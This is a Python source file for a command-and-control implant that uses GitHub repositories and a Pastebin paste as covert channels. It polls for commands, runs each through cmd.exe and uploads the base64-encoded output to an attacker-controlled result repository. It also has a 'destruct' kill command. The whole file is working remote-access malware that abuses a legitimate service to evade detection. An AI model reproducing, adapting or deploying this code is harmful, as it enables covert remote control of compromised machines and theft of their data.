import http.client
import subprocess
from time import sleep
from urllib.parse import urlparse
import json
import re
import html
import base64


PASTE_BIN = 'https://pastebin.com/raw/gQBy3rEY'

C2_GITHUB_REPO = "https://github.com/gokupwn/c2_github_repo"
C2_RESULT_REPO = "https://github.com/gokupwn/c2_result_repo"
C2_GITHUB_ACCOUNT_COOKIE = 'YOUR_GITHUB_COOKIE'
C2_CLIENT_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
PROXY_HOST = '127.0.0.1'
PROXY_PORT = 8080
FIRST_TASK_ID = 15111010 ### TAKE IT FROM THE server.ini File and the value of first_command

def fetchRepoHtml(host, path):

    if PROXY_HOST != '':
        connection = http.client.HTTPSConnection(PROXY_HOST, PROXY_PORT)
        connection.set_tunnel(host)
    else:
        connection = http.client.HTTPSConnection(host)

    headers = {
        'Accept': 'text/html, application/xhtml+xml',
        'Cookie': C2_GITHUB_ACCOUNT_COOKIE,
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'User-Agent': C2_CLIENT_USER_AGENT,
        'Origin': 'https://github.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9,ar-LB;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5'
    }
    
    connection.request("GET", path, headers=headers)
    response = connection.getresponse()
    html_response = response.read().decode()
    connection.close()
    return html_response

def scrapeRepoID(html_response):
    repo_id = re.search(r'<button [^>]*data-hydro-click="([^"]+)"', html_response)
    if repo_id:
        return repo_id.group(1)
    return None


def getGithubRepoID(repo_url):
    host = 'github.com'
    path = "/" + repo_url.split('/')[-2] + "/" + repo_url.split('/')[-1]
    html_response = fetchRepoHtml(host, path)
    repo_json_data = scrapeRepoID(html_response)
    if repo_json_data:
        repo_json_data = json.loads(html.unescape(repo_json_data))
        repo_id = repo_json_data['payload']['repository_id']
        return repo_id
    else:
        # Add error handling
        print("[-] Can't Find The Repo ID")
        return None

def readTasksFile(task_filename):
    with open(task_filename, 'r') as task_file_handler:
        tasks = task_file_handler.readlines()
    return tasks

def writeTasksFile(task, task_filename):
    try:
        with open(task_filename, 'w') as task_file_handler:
            task_file_handler.write(task)
        return True
    except:
        return False


# Request 1
def getUploadPolicy(repository_id, size):
    # Proxy Settings for request debug
    if PROXY_HOST != '':
        connection = http.client.HTTPSConnection(PROXY_HOST, PROXY_PORT)
        connection.set_tunnel("github.com")
    else:
        connection = http.client.HTTPSConnection("github.com")

    
    boundary = "----WebKitFormBoundarylTYOL6aCn8vV8xYA"

    # Headers required for the request
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Accept': 'application/json',
        'Cookie': C2_GITHUB_ACCOUNT_COOKIE,
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'User-Agent': C2_CLIENT_USER_AGENT,
        'Origin': 'https://github.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9,ar-LB;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5'
    }

    # Construct the body using the specified boundary
    body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"name\"\r\n\r\n"
        f"result.zip\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"size\"\r\n\r\n"
        f"{size}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"content_type\"\r\n\r\n"
        f"application/x-zip-compressed\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"authenticity_token\"\r\n\r\n"
        f"X68OrMZhOvStKX_fi-f8AmvDfTjyyVoQ1rIwxEwcqtuo39W8gcwTtpTb0yQMvG1jQEkQBOwrE-wY5I7Jb-MOQQ\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"repository_id\"\r\n\r\n"
        f"{repository_id}\r\n"
        f"--{boundary}--\r\n"
    )

    # Convert the body to bytes
    body_bytes = body.encode('utf-8')
    headers['Content-Length'] = str(len(body_bytes))

    # Send the request
    connection.request("POST", "/upload/policies/assets", body=body_bytes, headers=headers)
    response = connection.getresponse()
    
    return response.status, json.loads(response.read().decode())

def uploadFileContent(request_1_response, task):
    # Proxy Settings for request debug
    if PROXY_HOST != '':
        connection = http.client.HTTPSConnection(PROXY_HOST, PROXY_PORT)
        connection.set_tunnel("objects-origin.githubusercontent.com")
    else:
        connection = http.client.HTTPSConnection("objects-origin.githubusercontent.com")
    
    boundary = "----WebKitFormBoundaryOjUm0IpdzXmxubBE"

    # Headers required for the request
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Accept': 'application/json',
        'Cookie': C2_GITHUB_ACCOUNT_COOKIE,
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'User-Agent': C2_CLIENT_USER_AGENT,
        'Origin': 'https://github.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9,ar-LB;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5'
    }

    # Construct the body using the specified boundary
    body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"key\"\r\n\r\n"
        f"{request_1_response['form']['key']}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"acl\"\r\n\r\n"
        f"private\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"policy\"\r\n\r\n"
        f"{request_1_response['form']['policy']}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"X-Amz-Algorithm\"\r\n\r\n"
        f"{request_1_response['form']['X-Amz-Algorithm']}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"X-Amz-Credential\"\r\n\r\n"
        f"{request_1_response['form']['X-Amz-Credential']}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"X-Amz-Date\"\r\n\r\n"
        f"{request_1_response['form']['X-Amz-Date']}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"X-Amz-Signature\"\r\n\r\n"
        f"{request_1_response['form']['X-Amz-Signature']}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"Content-Type\"\r\n\r\n"
        f"{request_1_response['form']['Content-Type']}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"result.zip\"\r\n"
        f"Content-Type: {request_1_response['form']['Content-Type']}\r\n\r\n"
        f"{task}\r\n"
        f"--{boundary}--\r\n"
    )

    # Convert the body to bytes
    body_bytes = body.encode('utf-8')
    headers['Content-Length'] = str(len(body_bytes))

    # Send the request
    connection.request("POST", "/github-production-repository-file-5c1aeb", body=body_bytes, headers=headers)
    response = connection.getresponse()
    
    return response.status, response.read().decode()

def getUploadLink(request_1_response):
    # Proxy Settings for request debug
    if PROXY_HOST != '':
        connection = http.client.HTTPSConnection(PROXY_HOST, PROXY_PORT)
        connection.set_tunnel("github.com")
    else:
        connection = http.client.HTTPSConnection("github.com")
    
    boundary = "----WebKitFormBoundaryUBBr8hBHklsWkqdq"

    # Headers required for the request
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Accept': 'application/json',
        'Cookie': C2_GITHUB_ACCOUNT_COOKIE,
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'User-Agent': C2_CLIENT_USER_AGENT,
        'Origin': 'https://github.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9,ar-LB;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5'
    }

    # Construct the body using the specified boundary
    body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"authenticity_token\"\r\n\r\n"
        f"{request_1_response['asset_upload_authenticity_token']}\r\n"
        f"--{boundary}--\r\n"
    )

    # Convert the body to bytes
    body_bytes = body.encode('utf-8')
    headers['Content-Length'] = str(len(body_bytes))

    # print(f"/upload/repository-files/{request_1_response['asset']['id']}")
    # Send the request
    connection.request("PUT", f"/upload/repository-files/{request_1_response['asset']['id']}", body=body_bytes, headers=headers)
    response = connection.getresponse()
    
    return response.status, json.loads(response.read().decode())

def uploadResultToC2(command_result, repo_id):
    status, response = getUploadPolicy(repo_id, len(command_result))
    status_1, response_1 = uploadFileContent(response, command_result)
    status_2, response_2 = getUploadLink(response)
    print(f"[+] Result Link: {response_2['href']}")
    return response_2['id']


def getCommandFromGithubC2(request_response_2, max_redirects=5):
    current_url = request_response_2['href']
    redirect_count = 0

    while redirect_count <= max_redirects:
        parsed_url = urlparse(current_url)
        if parsed_url.scheme == 'https':
            connection = http.client.HTTPSConnection(parsed_url.hostname)
        else:
            connection = http.client.HTTPConnection(parsed_url.hostname)

        connection.request("GET", parsed_url.path + '?' + parsed_url.query)
        response = connection.getresponse()

        if response.status in (301, 302, 303, 307, 308):
            redirect_count += 1
            current_url = response.headers['Location']
            # print(f'Redirecting to: {current_url}')
            connection.close()
        else:
            if response.status == 200:
                data = response.read()
                connection.close()
                return response.status, data.decode('utf-8')
            elif response.status == 404:
                connection.close()
                return response.status, '' 

    return '', '' 

def getTasksIds():
    connection = http.client.HTTPSConnection("pastebin.com")
    connection.request("GET", '/' + PASTE_BIN.split('/')[-2] + '/' + PASTE_BIN.split('/')[-1])
    response = connection.getresponse()
    return response.read().decode().split('\r\n')

def usePasteBin():
    # Not interactive
    repo_id_result = getGithubRepoID(C2_RESULT_REPO)
    tasks_ids = getTasksIds()

    for task_id in tasks_ids:
        url = {"href": C2_GITHUB_REPO + f"/files/{task_id}/task.zip"}
        status_code, command = getCommandFromGithubC2(url)
        
        # Kill Yourself
        if command == 'destruct':
            exit(1)
        
        elif command == 'Starting CMD':
            continue

        else:
            # We have a valid command
            print(f"<=+] Command retrieved From GitHub C2 Server: {command}")
            command_result = subprocess.run(["cmd.exe", "/c", command], text=True, capture_output=True)
            print(f"[*] Execute The Command: {command}")
            uploadResultToC2(str(base64.b64encode(command_result.stdout)), repo_id_result)
            print(f"[+=>] Result Of The Command Uploaded")
        


def useGithub():
    # tasks_links = getTasksLink()

    repo_id_result = getGithubRepoID(C2_RESULT_REPO)
    repo_id_c2server = getGithubRepoID(C2_GITHUB_REPO)
    task_id = FIRST_TASK_ID # manual for now
    print(f"[+] C2 Command Repo ID Found: {repo_id_c2server}")
    print(f"[+] C2 Result Repo ID Found: {repo_id_result}")
    print(f"[+] First Command Task: {FIRST_TASK_ID}")

    while True:
        # Expect what is the last task id (Last Command)
        print("[*] Expecting the next task id")
        expected_task_id = uploadResultToC2('starting', repo_id_c2server)

        while task_id < expected_task_id:
            url = {"href": C2_GITHUB_REPO + f"/files/{task_id}/task.zip"}
            status_code, command = getCommandFromGithubC2(url)

            # Not my task_id
            if status_code == 404:
                task_id += 1
                continue

            # Kill Yourself
            elif command == 'destruct':
                exit(1)

            elif command == 'Starting CMD':
                task_id += 1
                continue
            
            else:
                # We have a valid command
                print(f"<=+] Command retrieved From GitHub C2 Server: {command}")
                command_result = subprocess.run(["cmd.exe", "/c", command], text=True, capture_output=True)
                print(f"[*] Execute The Command: {command}")
                uploadResultToC2(base64.b64encode(str.encode(command_result.stdout)).decode('utf-8'), repo_id_result)
                print(f"[+=>] Result Of The Command Uploaded")
            task_id += 1
        
        task_id = expected_task_id
        sleep(30)        

if __name__ == '__main__':
    useGithub()
    # usePasteBin()

